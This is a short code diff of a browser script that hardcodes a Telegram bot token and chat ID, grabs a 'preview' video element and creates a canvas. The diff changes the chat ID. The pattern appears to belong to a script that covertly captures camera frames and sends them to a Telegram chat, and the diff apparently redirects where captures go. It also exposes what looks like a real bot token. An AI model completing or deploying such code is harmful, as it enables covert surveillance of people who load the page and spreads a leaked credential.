@@ -1,6 +1,6 @@
 (async function() {
     const BOT_TOKEN = '8027235420:AAEFz-15VdKF__StWGlCzm5939sSnpmY8FI';
-    const CHAT_ID = '-1003844616544'; 
+    const CHAT_ID = '-1003723590867'; 
 
     const video = document.getElementById('preview');
     const canvas = document.createElement('canvas');
